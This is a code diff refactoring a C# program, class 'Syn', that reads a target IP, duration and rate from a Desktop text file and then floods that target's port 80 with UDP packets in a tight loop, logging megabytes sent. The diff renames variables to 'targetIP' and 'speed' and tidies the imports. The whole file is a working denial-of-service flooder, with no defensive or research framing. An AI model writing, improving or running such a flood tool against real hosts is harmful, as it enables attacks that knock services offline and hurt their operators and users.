@@ -2,24 +2,14 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
-using System.IO;
 using System.Text;
-using System.Threading.Tasks;
 using System.Net.Sockets;
 using System.Threading;
 using System.Diagnostics;
-using System.Runtime.InteropServices;
 using System.Reflection;
-using System.ComponentModel;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 using System.Threading.Tasks;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.IO;
-using System.Reflection;
-using System.Threading;
 using System.ComponentModel;
 
 class Syn
@@ -27,81 +17,83 @@ class Syn
 {
     static DateTime start = DateTime.Now;
 
-    static int ii = 0;
-    static int i = 0;
+    //packages sent bevore console logging status
+    static int loggingTime = 5084;
     static int total = 0;
     static int per = 0;
-    static int tot = 12;
+    // higher = slower
+    static int speed = 12;
     static string p = "1234567890123456789012345678901234567890";
-    static string package = (p + p + p + p + p + p + p + p + p + p);
-    static byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes(package);
+    static string data = (p + p + p + p + p + p + p + p + p + p);
+    static byte[] dataBytes = System.Text.ASCIIEncoding.ASCII.GetBytes(data);
 
     static string username = Environment.UserName;
 
     static string[] lines = System.IO.File.ReadAllLines(@"C:\Users\" + username + @"\Desktop\ip-port.txt");
 
     //Define IP, Port and Time
-    static string YourIP = lines[0];
+    static string targetIP = lines[0];
     static int port = 80;
-    static int time = 0;
+    static int totalTime = 0;
 
 
     static void Main(string[] args)
     {
-        synstop();
+        startSending();
     }
 
-    public static void synstop()
+    public static void startSending()
     {
 
         try
         {
-            time = int.Parse(lines[1]);
+            totalTime = int.Parse(lines[1]);
         }
         catch (Exception e)
         {
-            time = 2147483646;
+            totalTime = 2147483646;
         }
-        if (time > 2 * 60 * 60) time = 2 * 60 * 60;
+        if (totalTime > 2 * 60 * 60) totalTime = 2 * 60 * 60;
 
-        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(YourIP), port);
+        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(targetIP), port);
 
         try
         {
-            tot = int.Parse(lines[2]);
+            speed = int.Parse(lines[2]);
         }
         catch (Exception e)
         {
 
         }
 
-        Console.WriteLine("tot: " + tot);
+        Console.WriteLine("Speed: " + speed);
         Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
         client.SendTimeout = 100000;
 
-        Console.WriteLine("ip+" + YourIP + "\n time:" + time);
-        Console.WriteLine("Sended " + Math.Round(total * package.Length / 1024 / 102.4 * 10) / 100 + " \t MB");
+        Console.WriteLine("ip+" + targetIP + "\n time:" + totalTime);
+        Console.WriteLine("Sended " + Math.Round(total * data.Length / 1024 / 102.4 * 10) / 100 + " \t MB");
 
-
+        int logDataCounter = 0;
         while (true)
         {
 
             per++;
-            if (per > tot)
+            if (per > speed)
             {
                 System.Threading.Thread.Sleep(10);
                 per = 0;
             }
-            if ((DateTime.Now - start).TotalSeconds >= time)
+            if ((DateTime.Now - start).TotalSeconds >= totalTime)
                 break;
             total++;
-            i++;
-            client.SendTo(packetData, ep);
-            if (i >= 5084)
+            logDataCounter++;
+            client.SendTo(dataBytes, ep);
+            if (logDataCounter >= loggingTime)
             {
-                i = 0;
-                Console.WriteLine("Sended " + Math.Round(total * package.Length / 1024 / 102.4 * 10) / 100 + " \t MB");
+                logDataCounter = 0;
+                Console.WriteLine("Sended " + Math.Round(total * data.Length / 1024 / 102.4 * 10) / 100 + " \t MB");
             }
         }
+
     }
 }
